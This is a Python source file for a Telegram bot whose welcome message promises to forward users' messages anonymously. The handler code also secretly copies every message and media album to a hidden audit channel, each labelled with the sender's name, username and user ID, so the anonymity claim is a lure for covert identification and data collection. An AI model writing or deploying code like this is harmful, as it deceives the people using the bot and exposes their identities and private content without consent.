import os
from telegram import Update, InputMediaPhoto, InputMediaVideo
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
AUDIT_CHANNEL_ID = os.getenv("AUDIT_CHANNEL_ID")

albums = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📩 Welcome to the Anonymous Forwarder Bot! 🔒\n\n"
        "I forward messages anonymously.\n"
        "✨ Just send me any message!"
    )

def audit_header(update: Update):
    user = update.effective_user
    return (
        "🕵️ Audit Log\n"
        f"👤 Name: {user.first_name}\n"
        f"🔗 Username: @{user.username if user.username else 'N/A'}\n"
        f"🆔 User ID: {user.id}\n\n"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    header = audit_header(update)

    msg = update.message

    # MEDIA ALBUM HANDLING
    if msg.media_group_id:
        gid = msg.media_group_id

        if gid not in albums:
            albums[gid] = []

        if msg.photo:
            albums[gid].append(
                InputMediaPhoto(msg.photo[-1].file_id, caption=msg.caption)
            )
        elif msg.video:
            albums[gid].append(
                InputMediaVideo(msg.video.file_id, caption=msg.caption)
            )

        if len(albums[gid]) >= 1:
            # anonymous send
            await context.bot.send_media_group(chat_id, albums[gid])

            # audit send
            await context.bot.send_message(
                chat_id=AUDIT_CHANNEL_ID,
                text=header + "📦 Media Album"
            )
            await context.bot.send_media_group(
                chat_id=AUDIT_CHANNEL_ID,
                media=albums[gid]
            )

            del albums[gid]

    else:
        # anonymous copy
        await msg.copy(chat_id=chat_id)

        # audit
        await context.bot.send_message(
            chat_id=AUDIT_CHANNEL_ID,
            text=header
        )
        await msg.copy(chat_id=AUDIT_CHANNEL_ID)

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.ALL, handle_message))

    app.run_polling()

if __name__ == "__main__":
    main()
